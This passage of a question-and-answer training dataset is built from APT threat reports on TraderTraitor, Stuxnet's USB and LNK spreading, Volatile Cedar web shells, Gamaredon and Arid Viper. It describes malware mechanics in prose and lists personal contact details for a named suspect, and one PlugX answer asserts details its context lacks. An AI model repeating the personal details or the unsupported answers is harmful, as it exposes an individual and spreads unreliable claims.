    "output": "Answer: Data Execution Prevention (DEP) was considered crucial in mitigating the risks associated with Operation Aurora because it helps prevent malicious code from executing on a system. DEP performs additional checks on memory to ensure that code is not run from data pages, such as the default heap and the stack, where it typically should not be executed. Hardware-enforced DEP detects and raises exceptions when code attempts to execute from these locations, while software-enforced DEP helps prevent malicious code from exploiting exception-handling mechanisms in Windows. This layered protection mechanism is essential for safeguarding systems against attacks like Operation Aurora, which exploit vulnerabilities in applications like Microsoft Internet Explorer.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Threat Update\nThe U.S. government has identified a group of North Korean state-sponsored malicious cyber actors using tactics similar to the previously identified Lazarus Group (see AppleJeus: Analysis of North Korea's Cryptocurrency Malware). The Lazarus Group used AppleJeus trojanized cryptocurrency applications targeting individuals and companies\u2014including cryptocurrency exchanges and financial services companies\u2014through the dissemination of cryptocurrency trading applications that were modified to include malware that facilitates theft of cryptocurrency. As of April 2022, North Korea's Lazarus Group actors have targeted various firms, entities, and exchanges in the blockchain and cryptocurrency industry using spearphishing campaigns and malware to steal cryptocurrency. These actors will likely continue exploiting vulnerabilities of cryptocurrency technology firms, gaming companies, and exchanges to generate and launder funds to support the North Korean regime.\nMedium Headline: Tactics, Techniques and Procedures\nIntrusions begin with a large number of spearphishing messages sent to employees of cryptocurrency companies\u2014often working in system administration or software development/IT operations (DevOps)\u2014on a variety of communication platforms. The messages often mimic a recruitment effort and offer high-paying jobs to entice the recipients to download malware-laced cryptocurrency applications, which the U.S. government refers to as \"TraderTraitor.\"\nThe term TraderTraitor describes a series of malicious applications written using cross-platform JavaScript code with the Node.js runtime environment using the Electron framework. The malicious applications are derived from a variety of open-source projects and purport to be cryptocurrency trading or price prediction tools. TraderTraitor campaigns feature websites with modern design advertising the alleged features of the applications (see figure 1).\nThe JavaScript code providing the core functions of the software is bundled with Webpack. Within the code is a function that purports to be an \"update,\" with a name such as UpdateCheckSync(), that downloads and executes a malicious payload (see figure 2).\nThe update function makes an HTTP POST request to a PHP script hosted on the TraderTraitor project's domain at either the endpoint /update/ or /oath/checkupdate.php. In recent variants, the server's response is parsed as a JSON document with a key-value pair, where the key is used as an AES 256 encryption key in Cipher Block Chaining (CBC) or Counter (CTR) mode to decrypt the value. The decrypted data is written as a file to the system's temporary directory, as provided by the os.tmpdir() method of Node.js, and executed using the child_process.exec() method of Node.js, which spawns a shell as a child process of the current Electron application. The text \"Update Finished\" is then logged to the shell for the user to see.\nObserved payloads include updated macOS and Windows variants of Manuscrypt, a custom remote access trojan (RAT), that collects system information and has the ability to execute arbitrary commands and download additional payloads (see North Korean Remote Access Tool: COPPERHEDGE). Post-compromise activity is tailored specifically to the victim's environment and at times has been completed within a week of the initial intrusion.\nSmall Headline: TokenAIS\nTokenAIS purports to help \"build a portfolio of AI-based trading\" for cryptocurrencies. Mach-O binaries packaged within the Electron application contained an Apple digital signature issued for the Apple Developer Team RN4BTXA4SA. The certificate associated with Apple Developer Team RN4BTXA4SA has been revoked. The application requires users to \"register\" an account by entering an email address and a password to use its features. The malicious TraderTraitor code is a Node.js function called UpdateCheckSync() located in a file named , which is bundled in a file called , which is in an archive called app.asar. This function passes the email address that the user provided and the system platform to the C2 server, decrypts the response using AES 256 in CBC mode with the hardcoded initialization vector (IV) !@34QWer%^78TYui and a key provided in the response, then writes the decrypted data to a file and executes it in a new shell.\nSmall Headline: CryptAIS\nCryptAIS uses the same language as TokenAIS to advertise that it \"helps build a portfolio of AI-based trading.\" It is distributed as an Apple Disk Image (DMG) file that is digitally signed by an Apple digital signature issued for the Apple Developer Team CMHD64V5R8. The certificate associated with Apple Developer Team CMHD64V5R8 has been revoked. The application requires users to \"register\" an account by entering an email address and a password to use its features. The malicious TraderTraitor code is a Node.js function called UpdateCheckSync() located in a file named , which is bundled in a file called , which is in an archive called app.asar. This function passes the email address that the user provided and the system platform to the C2 server, decrypts the response using AES 256 in CTR mode and a key provided in the response, then writes the decrypted data to a file and executes it in a new shell.\nSmall Headline: AlticGO\nAlticGO was observed packaged as Nullsoft Scriptable Install System (NSIS) Windows executables that extracted an Electron application packaged for Windows. These executables contain a simpler version of TraderTraitor code in a function exported as UpdateCheckSync() located in a file named , which is bundled in , which is in the app.asar archive. The function calls an external function located in a file  bundled in  to make an HTTP request to hxxps://www.alticgo[.]com/update/. One AlticGO sample, e3d98cc4539068ce335f1240deb1d72a0b57b9ca5803254616ea4999b66703ad, instead contacts hxxps://www.esilet[.]com/update/ (see below for more information about Esilet). Some image resources bundled with the application included the CreAI Deck logo (see below for more information about CreAI Deck). The response is written to disk and executed in a new shell using the child_process.exec() method in Node.js. Unlike newer versions of TraderTraitor, there is no mechanism to decrypt a payload.\nSmall Headline: Esilet\nEsilet claims to offer live cryptocurrency prices and price predictions. It contains a simpler version of TraderTraitor code in a function exported as UpdateCheckSync() located in a file named , which is bundled in , which is in the app.asar archive. The function calls an external function located in a file  bundled in to make an HTTP request to hxxps://www.esilet[.]com/update/. The response is written to disk and executed in a new shell using the child_process.exec() method in Node.js. Unlike newer versions of TraderTraitor, there is no mechanism to decrypt a payload. Esilet has been observed delivering payloads of at least two different macOS variants of Manuscrypt, 9d9dda39af17a37d92b429b68f4a8fc0a76e93ff1bd03f06258c51b73eb40efa and dced1acbbe11db2b9e7ae44a617f3c12d6613a8188f6a1ece0451e4cd4205156.\n\nWhat is the role of the Esilet variant in the TraderTraitor malware campaign, and how does it deliver its payloads compared to other variants?",
    "output": "A: Esilet is a variant of the TraderTraitor malware that claims to offer live cryptocurrency prices and price predictions. It contains a simpler version of TraderTraitor code in a function exported as UpdateCheckSync(), located in a file bundled in the app.asar archive. This function makes an HTTP request to hxxps://www.esilet[.]com/update/, and the response is written to disk and executed in a new shell using the child_process.exec() method in Node.js. Unlike newer versions of TraderTraitor, Esilet does not have a mechanism to decrypt a payload. It has been observed delivering payloads of at least two different macOS variants of Manuscrypt, which are custom remote access trojans (RATs) that collect system information and have the ability to execute arbitrary commands and download additional payloads.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What are the key differences between the U.S. and South Korean perspectives on North Korea's cyber warfare program? How do these differing views impact their respective approaches to cybersecurity?",
    "output": "The U.S. views North Korea's cyber warfare program as a form of modern asymmetrical warfare, recognizing it as a significant threat to U.S. interests and international stability. In contrast, South Korea perceives North Korea's cyber capabilities as a terroristic threat, anticipating a potential multifaceted attack on its society, infrastructure, and military command centers. These differing views lead to varied approaches in cybersecurity. The U.S. focuses on defending against asymmetrical threats, while South Korea prioritizes preparing for a comprehensive, terroristic cyber assault, including training thousands of personnel to defend against such attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Threat Intelligence\nEven though attackers tried to make it look like the spear phishing email was sent by an email id associated with Hidrofersa but inspecting the email headers revealed some interesting information.\nThe X-AuthUser in the header below revealed the identity of the sender. The sender is associated with a company named \"Combined Freight (PVT) Limited\" (combinedfreight[.]com)\nCombined Freight (PVT) Limited is freight forwarding company which is into ocean & air freight business headquartered in Karachi, Pakistan (as per their website). This company has 4 other offices in Pakistan (Lahore, Islamabad, Sialkot, Faisalabad). Below is the screen shot taken from their website.\nBased on the information mentioned above, It looks like the spoofed email was sent by a user associated with a Pakistan based company Combined Freight (PVT) Limited.\nBig Headline: Indicators Of Compromise\nIn this case the cyber espionage group targeted Mazagon Dock Shipbuilders Limited (MDL) but it is possible that other defense equipment manufacturers could also be targeted as part of this attack campaign. The indicators associated with this attack are provided so that the organizations (Government, Public, Private organizations, Defense and Defense equipment manufacturers) can use these indicators to detect, remediate and investigate this attack campaign. Below are the indicators\nBig Headline: Conclusion\nAttackers in this case made every attempt to launch a clever attack campaign by spoofing legitimate email ids and using an email theme relevant to the targets. The following factors in this cyber attack suggests the possible involvement of Pakistan state sponsored cyber espionage group to steal the intellectual property such as design/blueprints and manufacturing data related to submarines and warships.\nVictims/targets chosen (Submarine & Warship manufacturer for Indian Navy)\nUse of Email theme related to the targets\nTiming of the spear phishing emails sent to the victims (The day before the Republic Day)\nEmail header information indicating the possible Pakistan connection\nUse of malware that is capable of spying and uploading screen shots\nUse of TTP's (tactics, techniques & procedures) similar to the (<https://cysinfo.com/uri-terror-attack-spear-phishing-emails-targeting-indian-embassies-and-indian-mea/>)previous campaign\nThe following factors reveal the attackers intention to remain stealthy and the attempt to evade sandbox analysis, manual analysis and security monitoring at both the desktop and network levels.\nUse of obfuscated malicious macro code\nUse of junk code (to divert the manual analysis)\nUse of compromised university site to host malicious code (to bypass security monitoring)\nUse of Silent UAC (user account control) bypass technique\nUse of Malware that sleeps for long time without generating any network activity (to evade sandbox analysis)\nUse of hosting provider to host C2 infrastructure\nCyber espionage groups will continue targeting defense sectors and defense equipment manufacturers for the following reasons:\nTo steal defense related information and proprietary product information that can provide their sponsoring governments with military and economic advantages.\nTo identify vulnerabilities in the defense technologies to gain advantage over adversary's military capabilities\nTo reduce their research and development costs and produce and sell similar products at lower prices\n\nBased on the above text, answer a question. What tactics, techniques, and procedures (TTPs) were employed by the attackers to evade detection and remain stealthy during the cyber espionage campaign against Mazagon Dock Shipbuilders Limited (MDL)?",
    "output": "The attackers employed several advanced tactics, techniques, and procedures (TTPs) to evade detection and remain stealthy. These included the use of obfuscated malicious macro code to hide the true nature of the malware, incorporating junk code to divert manual analysis efforts, and utilizing a compromised university site to host malicious code, thereby bypassing security monitoring. Additionally, they employed a silent User Account Control (UAC) bypass technique and utilized malware that remained dormant for extended periods without generating any network activity to evade sandbox analysis. The attackers also leveraged a hosting provider to set up their command and control (C2) infrastructure, further complicating detection efforts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: APPENDIX B \u2013 REMOVABLE MEDIA INFECTION\nExplosive has integrated functionality to enable USB and other mass storage device infection. The functionality can be enabled or disabled by setting the DLD-USI flag in the configuration section.\nWhen enabled, an additional configuration option, DLD-USA, dictates the specific infection method. The possible infection methods are:\n\u2022 Autorun.exe \u2013 Explosive copies itself into the USB root directory and changes the filename to 'autorun.exe.'\n\u2022 Autorun.inf \u2013 This is the same as the 'autorun.exe' option, but with an additional 'autorun.inf' file copied into the same directory.\n\u2022 EXE infection \u2013 Explosive scans all *.exe files located in the USB drive, looking for previous infections. Previous infections are located by using the Exported PathProcess function from the Explosive DLL. If no previous infections were found, Explosive copies each *.exe file into the system's temporary folder (%temp%) and adds both the Explosive EXE and DLL files to its binary data To extract the injected files, a \"Loader\" binary is then injected into the file's binary. This \"Loader\" is set to be the main executable module. Once the injected file is executed, the \"Loader\" code is used to extract the Explosive files and resume the functionality of the original file. After the infection is complete, all infected files are returned to the USB drive and overwrite the original file. A special string \"^!#^~|\" is used by the \"Loader\" to parse and run the executable file.\n\u2022 All \u2013 Uses all of the listed options.\nBig Headline: APPENDIX F \u2013 WEB SHELLS\nThe web shells injected into the compromised web servers are mostly custom made. They are written in various languages, such as ASP, ASP.Net and PHP.\nThese web shells contain many capabilities and have been seen to be heavily used by the attacker throughout the attack lifetime. Some of the web-shells functionalities are:\n\u2022 Run remote commands\n\u2022 Upload\\Download files\n\u2022 Account brute forcing\n\u2022 Registry Access\nThe most common web shell used by the attackers is the Caterpillar web shell (name taken from the web shell code) which is a variant of the AspxSpy web shell.\nOther web shells have also been used in the Volatile Cedar campaign, such as the KIDO web shell.\nThese are the filenames and hashes of the detected web shells:\n\nBased on the above text, answer a question. What are the primary functionalities of the web shells used in the Volatile Cedar campaign, and what are some examples of the web shells identified?",
    "output": "The web shells injected into the compromised web servers in the Volatile Cedar campaign are mostly custom made and written in various languages such as ASP, ASP.Net, and PHP. These web shells contain many capabilities and have been heavily used by the attacker throughout the attack lifetime. Some of the web-shells functionalities include:\\n\\n\u2022 Running remote commands\\n\\n\u2022 Uploading/Downloading files\\n\\n\u2022 Account brute forcing\\n\\n\u2022 Registry Access\\n\\nThe most common web shell used by the attackers is the Caterpillar web shell, which is a variant of the AspxSpy web shell. Other web shells have also been used in the Volatile Cedar campaign, such as the KIDO web shell.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "The Gamaredon Group Toolset Evolution\nBy Anthony Kasza and Dominik Reichel\n2/27/2017\nUnit 42 threat researchers have recently observed a threat group distributing new, custom developed malware. We have labelled this threat group the Gamaredon Group and our research shows that the Gamaredon Group has been active since at least 2013.\nIn the past, the Gamaredon Group has relied heavily on off-the-shelf tools. Our new research shows the Gamaredon Group have made a shift to custom-developed malware. We believe this shift indicates the Gamaredon Group have improved their technical capabilities. The custom-developed malware is fully featured an includes these capabilities:\nA mechanism for downloading and executing additional payloads of their choice\nThe ability to scan system drives for specific file types\nThe ability to capture screenshots\nThe ability to remotely execute commands on the system in the user's security context\nThe Gamaredon Group primarily makes use of compromised domains, dynamic DNS providers, Russian and Ukrainian country code top-level domains (ccTLDs), and Russian hosting providers to distribute their custom-built malware.\nAntimalware technologies have a poor record of detecting the malware this group has developed. We believe this is likely due to the modular nature of the malware, the malware's heavy use of batch scripts, and the abuse of legitimate applications and tools (such as wget) for malicious purposes.\nPreviously, (<https://www.lookingglasscyber.com/operation-armageddon-registration/>)LookingGlass reported on a campaign they named \"Operation Armageddon,\" targeting individuals involved in the Ukrainian military and national security establishment. Because we believe this group is behind that campaign, we've named them the Gamaredon Group, an anagram of \"Armageddon\". At this time, it is unknown if the new payloads this group is distributing is a continuation of Operation Armageddon or a new campaign.\nQuestion: Why did the Gamaredon Group shift from using off-the-shelf tools to custom-developed malware, and what specific capabilities does this new malware possess? Additionally, how does the distribution method of their custom-built malware reflect their operational strategy?",
    "output": "Answer: The Gamaredon Group shifted from using off-the-shelf tools to custom-developed malware to enhance their technical capabilities. This shift indicates an improvement in their sophistication and effectiveness. The custom-developed malware includes several advanced features such as the ability to download and execute additional payloads, scan system drives for specific file types, capture screenshots, and remotely execute commands within the user's security context. The group primarily uses compromised domains, dynamic DNS providers, Russian and Ukrainian country code top-level domains (ccTLDs), and Russian hosting providers to distribute their custom-built malware. This distribution method reflects their strategy to evade detection and target specific regions, leveraging local infrastructure and services.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: MS08-067 Windows Server Service vulnerability\nIn addition, Stuxnet also exploits (<http://www.microsoft.com/technet/security/bulletin/ms08-067.mspx>)MS08-067, which is the same vulnerability utilized by (<http://www.symantec.com/security_response/writeup.jsp?docid=2008-112203-2408-99>)W32.Downadup. MS08-067 can be exploited by connecting over SMB and sending a malformed path string that allows arbitrary execution. Stuxnet uses this vulnerability to copy itself to unpatched remote computers.\nStuxnet will verify the following conditions before exploiting MS08-67:\n\u2022 The current date must be before January 1, 2030\n\u2022 Antivirus definitions for a variety of antivirus products dated before January 1, 2009\n\u2022 Kernel32.dll and Netapi32.dll timestamps after October 12, 2008 (before patch day)\nMedium Headline: Removable drive propagation\nOne of the main propagation methods Stuxnet uses is to copy itself to inserted removable drives. Industrial control systems are commonly programmed by a Windows computer that is non-networked and operators often exchange data with other computers using removable drives. Stuxnet used two methods to spread to and from removable drives\u2014one method using a vulnerability that allowed auto-execution when viewing the removable drive and the other using an autorun.inf file.\nMedium Headline: LNK Vulnerability (CVE-2010-2568)\nStuxnet will copy itself and its supporting files to available removable drives any time a removable drive is inserted, and has the ability to do so if specifically instructed. The removable-drive copying is implemented by exports 1, 19, and 32. Export 19 must be called by other code and then it performs the copying routine immediately. Exports 1 and 32 both register routines to wait until a removable drive is inserted. The exports that cause replication to removable drives will also remove infections on the removable drives, depending on a configuration value stored in the configuration data block. Different circumstances will cause Stuxnet to remove the files from an infected removable drive. For example, once the removable drive has infected three computers, the files on the removable drive will be deleted.\nIf called from Export 1 or 32, Stuxnet will first verify it is running within services.exe, and determines which version of Windows it is running on. Next, it creates a new hidden window with the class name 'AFX64c313' that waits for a removable drive to be inserted (via the WM_DEVICECHANGE message), verifies it contains a logical volume (has a type of DBT_DEVTYP_VOLUME), and is a removable drive (has a drive type of DEVICE_REMOVABLE). Before infecting the drive, the current time must be before June 24, 2012.\nNext, Stuxnet determines the drive letter of the newly inserted drive and reads in the configuration data to determine if it should remove itself from the removable drive or copy itself to the removable drive. When removing itself, it deletes the following files:\n\u2022 %DriveLetter%\\~WTR4132.tmp\n\u2022 %DriveLetter%\\~WTR4141.tmp\n\u2022 %DriveLetter%\\Copy of Shortcut to.lnk\n\u2022 %DriveLetter%\\Copy of Copy of Shortcut to.lnk\n\u2022 %DriveLetter%\\Copy of Copy of Copy of Shortcut to.lnk\n\u2022 %DriveLetter%\\Copy of Copy of Copy of Copy of Shortcut to.lnk\nIf the removable drive should be infected, the drive is first checked to see if it is suitable, checking the following conditions:\n\u2022 The drive was not just infected, determined by the current time.\n\u2022 The configuration flag to infect removable drives must be set, otherwise infections occur depending on the date, but this is not set by default.\n\u2022 The infection is less than 21 days old.\n\u2022 The drive has at least 5MB of free space.\n\u2022 The drive has at least 3 files.\nIf these conditions are met, the following files are created:\n\u2022 %DriveLetter%\\~WTR4132.tmp (~500Kb)\n(This file contains Stuxnet's main DLL in the stub section and is derived from Resource 210.)\n\u2022 %DriveLetter%\\~WTR4141.tmp (~25Kb)\n(This file loads ~WTR4132.tmp and is built from Resource 241.)\n\u2022 %DriveLetter%\\Copy of Shortcut to.lnk\n\u2022 %DriveLetter%\\Copy of Copy of Shortcut to.lnk\n\u2022 %DriveLetter%\\Copy of Copy of Copy of Shortcut to.lnk\n\u2022 %DriveLetter%\\Copy of Copy of Copy of Copy of Shortcut to.lnk\nThe .lnk files are created using Resource 240 as a template and four are needed as each specifically targets one or more different versions of Windows including Windows 2000, Windows XP, Windows Server 2003, Windows Vista, and Windows 7. The .lnk files contain an exploit that will automatically execute ~WTR4141.tmp when simply viewing the folder.\n~WTR4141.tmp then loads ~WTR4132.tmp, but before doing so, it attempts to hide the files on the removable drive. Hiding the files on the removable drive as early in the infection process as possible is important for the threat since the rootkit functionality is not installed yet, as described in the Windows Rootkit Functionality section. Thus, ~WTR4141.tmp implements its own less-robust technique in the meantime.\n~WTR4141.tmp hooks the following APIs from kernel32.dll and Ntdll.dll:\nFrom Kernel32.dll\n\u2022 FindFirstFileW\n\u2022 FindNextFileW\n\u2022 FindFirstFileExW\nFrom Ntdll.dll\n\u2022 NtQueryDirectoryFile\n\u2022 ZwQueryDirectoryFile\nIt replaces the original code for these functions with code that checks for files with the following properties:\n\u2022 Files with an .lnk extension having a size of 4,171 bytes.\n\u2022 Files named ~WTRxxxx.TMP, sized between 4Kb and 8 Mb, where xxxx is:\n\u2022 4 decimal digits. (~wtr4132.tmp)\n\u2022 The sum of these digits modulo 10 is null. (Example: 4+1+3+2=10=0 mod 10)\nIf a request is made to list a file with the above properties, the response from these APIs is altered to state that the file does not exist, thereby hiding all files with these properties.\nFigure 14\nUSB Execution Flow\nAfter the DLL APIs are hooked, ~WTR4132.tmp is loaded. To load a .dll file normally, a program calls the \"Load-Library\" API with the file name of the .dll file to be loaded into memory. W32.Stuxnet uses a different approach, not just in the first .dll file but in several different parts of the code. This method is described in the Bypassing Behavior Blocking When Loading DLLs section.\n~WTR4132.tmp contains the main Stuxnet DLL in the .stub section. This is extracted into memory and then Export 15 of the DLL is called executing the installation of Stuxnet. Export 15 is described in the Installation section.\nThe diagram to the right describes the execution flow.\nMedium Headline: AutoRun.Inf\nPrevious versions of Stuxnet did not use the LNK 0-day exploit, but instead spread via an autorun.inf file. Resource 207 is a 500kb file that was only present in the older version of Stuxnet, and was removed in the new version.\nAn autorun.inf file is a configuration file placed on removable drives that instructs Windows to automatically execute a file on the removable drive when the drive is inserted. Typically, one would place the autorun.inf file and executable in the root directory of the drive. However, Stuxnet uses a single file. Resource 207 is an executable file and also contains a correctly formatted autorun.inf data section at the end.\nWhen autorun.inf files are parsed by the Windows OS, the parsing is quite forgiving, meaning that any characters that are not understood as legitimate autorun commands are skipped. Stuxnet uses this to its advantage by placing the MZ file first inside the autorun.inf file. During parsing of the autorun.inf file all of the MZ file will be ignored until the legitimate autorun commands that are appended at the end of the file are encountered. See the header and footer of the autorun.inf file as shown in the following diagrams.\nFigure 15\nAutorun.inf header\nAutorun.inf footer\nWhen we show only the strings from the footer we can see that they are composed of legitimate autorun commands:\nFigure 17\nHidden autorun commands\nNotice that Stuxnet uses the autorun commands to specify the file to execute as the actual autorun.inf file. Using this trick, the autorun.inf file will be treated as a legitimate autorun.inf file first and later as a legitimate executable file.\nIn addition to this, Stuxnet also uses another trick to enhance the chances that it will be executed. The autorun commands turn off autoplay and then add a new command to the context menu. The command that is added is found in %Windir%\\System32\\shell32.dll,-8496. This is actually the \"Open\" string. Now when viewing the context menu for the removable device the user will actually see two \"Open\" commands.\nOne of these Open commands is the legitimate one and one is the command added by Stuxnet. If a user chooses to open the drive via this menu, Stuxnet will execute first. Stuxnet then opens the drive to hide that anything suspicious has occurred.\nFigure 18\nTwo \"Open\" commands\nAnswer this question: Describe the process by which Stuxnet infects a removable drive using the LNK vulnerability (CVE-2010-2568), including the steps taken to verify the suitability of the drive and the files created during the infection.",
    "output": "Stuxnet infects a removable drive using the LNK vulnerability by copying itself and its supporting files to the drive when it is inserted. The process involves verifying several conditions before infection: the drive was not just infected, the configuration flag to infect removable drives is set, the infection is less than 21 days old, the drive has at least 5MB of free space, and the drive has at least 3 files. If these conditions are met, Stuxnet creates the following files: ~WTR4132.tmp (containing Stuxnet's main DLL), ~WTR4141.tmp (which loads ~WTR4132.tmp), and multiple .lnk files that target different versions of Windows. These .lnk files contain an exploit that automatically executes ~WTR4141.tmp when the folder is viewed.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Analysis of a Recent PlugX Variant - \"P2P PlugX\"\nThis is Shusei Tomonaga at Analysis Center.\nPlugX, a Remote Access Tool (RAT) often seen in many APT cases, has been in the wild for some years. Various sectors in Japan have been suffering from this type of attack from 2012, and Analysis Center has been working to catch up on the evolution of the PlugX family since then.\nIn this blog post, I will write about a recent PlugX variant which we first encountered in October 2014. The variant has interesting new aspects and the most significant one, in my view, is the P2P function - so let me tentatively name it \"P2P PlugX\".\n\nBased on the above text, answer a question. How does the P2P function in the 'P2P PlugX' variant enhance its capabilities compared to traditional PlugX variants, and what implications does this have for cybersecurity professionals?",
    "output": "The P2P function in the 'P2P PlugX' variant significantly enhances its capabilities by allowing the malware to communicate directly between infected systems without relying on a central command and control server. This decentralized communication model makes it harder for cybersecurity professionals to detect and disrupt the malware's operations. Traditional PlugX variants typically rely on a single point of failure, which can be targeted to neutralize the threat. However, the P2P functionality introduces a more resilient and adaptive infrastructure, posing greater challenges for defenders. Cybersecurity professionals need to adopt advanced detection techniques and network monitoring strategies to identify and mitigate the spread of P2P PlugX effectively.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Mahmoud Hashem\nThe email address, mahmoud.hashem12@gmail.com, was used to register two Operation Arid Viper C&C servers\u2014mediahitech.info and ahmedfaiez.info\u2014and one of the Advtravel C&C domains\u2014fpupdate. info. Ahmedfaiez.com and fpupdate.info also has ties to the email address, moh.s009@gmail.com. This fact shows a relationship between\nthe two campaigns even if they used unrelated binaries. They did have some commonalities such as sharing a common network infrastructure.\nMoh.s009@gmail.com was also used to register six of the C&C servers\u2014ahmedfaiez.info, fpupdate. info, ineltdriver.com, flushupdate. com, flushupate.com, and advtravel. info\u2014related to the two campaigns. It was also found in DNS SOA records for linkedim.in, iwork-sys. com, nauss-lab.com, nice-mobiles. com, and abuhmaid.net.\nThe site, linkedim.in, was particularly registered using the following details:\nAhmed Jmal's email address was used to register two of Operation Arid Viper's C&C servers.\nThe registration details above ties the two email addresses\u2014mahmoud.hashem12@ gmail.com and moh.s009@gmail.com\u2014together. We believe they belong to the same person though we have yet to find a real person behind the profiles.\nSmall Headline: Dev_hima\nAs previously mentioned, several advtravel.info infection logs can be clearly linked to Operation Advtravel's malware developers or bot masters. It is also worth remembering that the malware used in Operations Advtravel and Operation Arid Viper distinctly differed from each other though they shared a common network infrastructure. The logs showed that the infection started from the same folder Visual Studio\u00ae drops a compiled file into and that screenshots showed other malware present on advtravel.info. This shows that advtravel.info is a development environment and could very likely be where the malware are programmed. The server's username is Dev_hima. A close look at other log files allowed us to find at least three other systems with the same user. Some of the samples gathered from the Trend Micro sample database listed down Dev_hima as an internal author as well.\nThe bot logs from Dev_hima look like logs from test environments with different virtual machines that belonged to the original developer who performed some debugging and testing. This mistake went even further, as while testing the malware, it took several screenshots of Dev_hima's system, which gave us some insight into his operations. The CPanel display in a Windows 8 environment showed how he went through victim logs. Other tabs open in the same browser display his Facebook profile page.\nThe control panel is a Windows tool called \"DHSDM.\" Its icon can also be seen as the rightmost program on the taskbar. This can be found on several of Dev_hima's test virtual machines. It also showed that Dev_ hima corresponded to the Admin user of the control panel. Other details recovered from logs revealed an IP address geolocated in Cairo, Egypt.\nAnother clue to Dev_hima's relation to the Advtravel malware was a working downloader from December 2014 that is related to advtravel. info. It downloaded a malware from a server that is then run on infected systems. The PE header data of this downloader again showed the name, Dev_hima as application publisher. Nveron appears to be Dev_ hima's filename for the malware.\nScreenshot of Dev_hima's system stored on advtravel.info\nInformation on a malware variant published by Dev_hima\nA web search for developers with the nickname, Dev_hima, turned up one profile that fit what we know so far very well. Dev_hima was not exactly hiding online. He actually had various online accounts\u2014http://devhima.blogspot.com/p/blog-page.html, http:// devhima.webs.com/about, youtube.com/user/ibrahhm2121/, facebook.com/devhima, twitter.com/dev_hima, linkedin.com/pub/ebrahim-elsharawy/69/324/7b5, scribd.com/ devhima, soundcloud.com/ebrahim-elsharawy, and devhima.tumblr.com\u2014that tie his real identity to his nickname.\nDev_hima can also be tied to the Skype ID, ibrahhm2121, along with the email addresses, dev_ hima@yahoo.com, devhima@ hotmail.com, ibrahhm2121@ gmail.com, ibrahhm212@gmail. com, and ibrahhm2121@yahoo. com. Of course, it is conceivable that a malicious hacker sought to appropriate El Sharawy's identity or coincidentally chose the same nickname.\nSome of Dev_hima's social networking profiles\nA look at malicious activities tied to the nickname, Dev_hima, revealed very interesting things. We found that Dev_hima was part of the \"Gaza Hacker Team,\" a group involved in multiple website hacking and defacement incidents against Israeli targets in the past. A few of the more than 2,000 defacement attacks the team carried out involved sites in Israel.\nDev_hima also has ties to several email addresses and online accounts\nSome of Dev_hima's hacker group profiles can also be found on gaza-hacker.org/cc/member-u_42271. html and arabteam2000-forum.com/ index.php/user/272853-dev-hima/. His personal project page\u2014http:// devhima.webs.com/\u2014showed several potentially malicious tools that he has coded. DevPcTwitter, for instance, allows attackers to control a target system using a Twitter account. DevSpy, meanwhile, allows parents to monitor their children's online communication and browsing habits for protection purposes. In reality though, DevSpy is simply a piece of spyware.\nDevPcTwitter (MD5: bfcb492d282960152a366b5760b87920d02c6e83) is publicly available for download on Dev_hima's site.\nThe structure of the last four DevPcTwitter commands\u2014getfile*[file_path]\u2014is interesting. The commands had a similar though not identical syntax to the format Dev_hima's bot used to communicate with advtravel.info.\nDev_hima shared tutorial videos on YouTube on how to configure and use DevPcTwitter. These videos were linked to his personal page. His Twitter bot's function is simple. It lets a user register a Twitter account and an email address in the\nList of website attacks that Dev_hima's hacker group was involved with\nDevPcTwitter program. The user can then start tweeting commands via the account registered, which the bot reads and executes. Commands such as GetScreenShot tells DevPcTwitter to take screenshots of a victim's desktop that it then emails to the email address registered. The bot can also download and execute files using the Download$[URL] command.\nDevPcTwitter's UI shows it was designed for Arabic-speaking users.\nDevPcTwitter is low-risk because it requires a lot of user interaction to set up and operate. Its bot does not have the functionality to stealthily run in the background as well.\nDev_hima also developed the spying tool, DevSpy. Its installer (MD5:\nTools available for public download on Dev_hima's website\nd325c541fa0f3080a25394fe3a586100910f5569)\nis also available for public download from http:// devhima.webs.com/. Unlike DevPcTwitter, the DevSpy interface uses English, not Arabic. Its setup is also pretty self-explanatory. It takes desktop screenshots at user-specified intervals that it then stores in a folder. It can stealthily run in the background. In stealth mode though, it can be only be accessed by pressing a hotkey that requires password authentication. In the same mode, DevSpy can remove itself from a victim's Windows Task Manager process list.\nDevSpy is medium- to high-risk because it is designed to spy on users in stealth mode. It is possible or even likely that the malware used to communicate with advtravel.info is a privately enhanced version of Dev_hima's tools.\n\nQ: How did the email addresses mahmoud.hashem12@gmail.com and moh.s009@gmail.com tie together the two campaigns, Operation Arid Viper and Advtravel? Explain the significance of this connection.",
    "output": "A: The email addresses mahmoud.hashem12@gmail.com and moh.s009@gmail.com were used to register multiple C&C servers related to both Operation Arid Viper and Advtravel. Specifically, mahmoud.hashem12@gmail.com was used to register mediahitech.info and ahmedfaiez.info for Operation Arid Viper, and fpupdate.info for Advtravel. Similarly, moh.s009@gmail.com was used to register ahmedfaiez.info, fpupdate.info, and several other domains for both campaigns. This overlap in email usage indicates a shared network infrastructure and suggests that the same individual or group might be behind both campaigns, despite the use of different malware binaries.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
